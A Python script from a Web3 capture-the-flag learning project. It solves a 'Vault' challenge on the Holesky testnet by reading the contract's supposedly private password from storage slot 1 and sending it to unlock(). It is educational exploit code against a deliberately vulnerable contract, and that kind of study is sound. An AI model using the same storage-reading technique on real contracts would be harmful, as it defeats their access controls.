# coding=utf-8
"""
@Project     : Web3-CTF-Intensive-CoLearning
@Author      : Snooowgh
@File Name   : Vault
@Description :
@Time        : 2024/8/30 10:37
"""
from web3 import Web3
import os

# Holesky
w3 = Web3(Web3.HTTPProvider("https://holesky.drpc.org"))

private_key = os.getenv('CTF_PRIVATE_KEY')
addr = w3.eth.account.from_key(private_key).address

target_contract = "0x5872B01BA4d698F7bCDB768fDfbd5Ae20AC68B14"

password = w3.eth.get_storage_at(target_contract, 1)

print(password)

contract_abi = [
    {
        "inputs": [
            {
                "internalType": "bytes32",
                "name": "_password",
                "type": "bytes32"
            }
        ],
        "name": "unlock",
        "outputs": [],
        "stateMutability": "nonpayable",
        "type": "function"
    },
    {
        "inputs": [],
        "name": "locked",
        "outputs": [
            {
                "internalType": "bool",
                "name": "",
                "type": "bool"
            }
        ],
        "stateMutability": "view",
        "type": "function"
    }
]

contract = w3.eth.contract(address=target_contract, abi=contract_abi)

tx = contract.functions.unlock(password).build_transaction({
    'from': addr,
    'nonce': w3.eth.get_transaction_count(addr),
    "value": 0,
    "gasPrice": w3.eth.gas_price
})
tx["gas"] = w3.eth.estimate_gas(tx)

print(contract.functions.locked().call())

signed_tx = w3.eth.account.sign_transaction(tx, private_key)
tx = w3.eth.send_raw_transaction(signed_tx.rawTransaction)
receipt = w3.eth.wait_for_transaction_receipt(tx)
print(receipt)

print(contract.functions.locked().call())